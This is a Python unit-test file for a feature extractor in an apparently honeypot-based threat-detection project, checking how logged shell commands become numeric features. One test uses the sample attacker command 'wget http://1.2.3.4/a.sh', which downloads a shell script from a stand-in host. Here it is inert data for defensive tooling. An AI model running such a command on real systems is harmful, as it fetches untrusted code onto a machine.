"""Isolated unit tests for FeatureExtractor.

Uses directly constructed DatasetRecord objects. Requires no Cowrie,
no Docker, no network, no database, no real log files, and no other
external services.
"""

from core.ai_engine.feature_extractor import FeatureExtractor, FeatureVector
from core.dataset_manager.builder import DatasetRecord


def _make_record(**overrides) -> DatasetRecord:
    defaults = dict(
        timestamp="2026-08-19T18:00:22.557428Z",
        source_ip="127.0.0.1",
        session_id="ce82815367a4",
        protocol="ssh",
        honeypot="Cowrie",
        event_type="cowrie.command.input",
        category="command_execution",
        severity="low",
        command="pwd",
        has_command=True,
        command_length=3,
        has_url=False,
        has_ip_address=False,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    defaults.update(overrides)
    return DatasetRecord(**defaults)


def test_pwd_like_record_produces_command_length_3():
    record = _make_record(command="pwd", command_length=3)
    vector = FeatureExtractor().extract(record)
    assert vector.command_length == 3


def test_has_command_true_becomes_1():
    record = _make_record(has_command=True)
    vector = FeatureExtractor().extract(record)
    assert vector.has_command == 1


def test_has_command_false_becomes_0():
    record = _make_record(has_command=False, command="", command_length=0)
    vector = FeatureExtractor().extract(record)
    assert vector.has_command == 0


def test_true_false_enrichment_values_convert_correctly():
    record = _make_record(
        has_url=True,
        has_ip_address=False,
        has_file_path=True,
        has_shell_metacharacters=False,
    )
    vector = FeatureExtractor().extract(record)
    assert vector.has_url == 1
    assert vector.has_ip_address == 0
    assert vector.has_file_path == 1
    assert vector.has_shell_metacharacters == 0


def test_all_feature_values_are_integers():
    vector = FeatureExtractor().extract(_make_record())
    assert isinstance(vector.command_length, int)
    assert isinstance(vector.has_command, int)
    assert isinstance(vector.has_url, int)
    assert isinstance(vector.has_ip_address, int)
    assert isinstance(vector.has_file_path, int)
    assert isinstance(vector.has_shell_metacharacters, int)


def test_combined_features_are_preserved_correctly():
    record = _make_record(
        command="wget http://1.2.3.4/a.sh",
        command_length=26,
        has_command=True,
        has_url=True,
        has_ip_address=True,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    vector = FeatureExtractor().extract(record)
    assert vector.command_length == 26
    assert vector.has_command == 1
    assert vector.has_url == 1
    assert vector.has_ip_address == 1
    assert vector.has_file_path == 0
    assert vector.has_shell_metacharacters == 0


def test_empty_command_produces_zeroed_features():
    record = _make_record(
        command="",
        command_length=0,
        has_command=False,
        has_url=False,
        has_ip_address=False,
        has_file_path=False,
        has_shell_metacharacters=False,
    )
    vector = FeatureExtractor().extract(record)
    assert vector.command_length == 0
    assert vector.has_command == 0
    assert vector.has_url == 0
    assert vector.has_ip_address == 0
    assert vector.has_file_path == 0
    assert vector.has_shell_metacharacters == 0


def test_extraction_does_not_modify_dataset_record():
    record = _make_record(command="pwd", command_length=3, has_command=True)

    FeatureExtractor().extract(record)

    assert record.command == "pwd"
    assert record.command_length == 3
    assert record.has_command is True


def test_same_input_produces_identical_feature_vector():
    record = _make_record(command="pwd", command_length=3)

    first = FeatureExtractor().extract(record)
    second = FeatureExtractor().extract(record)

    assert first == second
    assert isinstance(first, FeatureVector)


def test_unrelated_fields_do_not_affect_feature_vector():
    record_a = _make_record(
        timestamp="2026-08-19T18:00:00.000000Z",
        source_ip="127.0.0.1",
        session_id="sessionA",
        honeypot="Cowrie",
        event_type="cowrie.command.input",
        category="command_execution",
        severity="low",
        command="pwd",
        command_length=3,
    )
    record_b = _make_record(
        timestamp="2099-01-01T00:00:00.000000Z",
        source_ip="10.0.0.9",
        session_id="sessionB",
        honeypot="Dionaea",
        event_type="dionaea.something.else",
        category="other",
        severity="medium",
        command="pwd",
        command_length=3,
    )

    vector_a = FeatureExtractor().extract(record_a)
    vector_b = FeatureExtractor().extract(record_b)

    assert vector_a == vector_b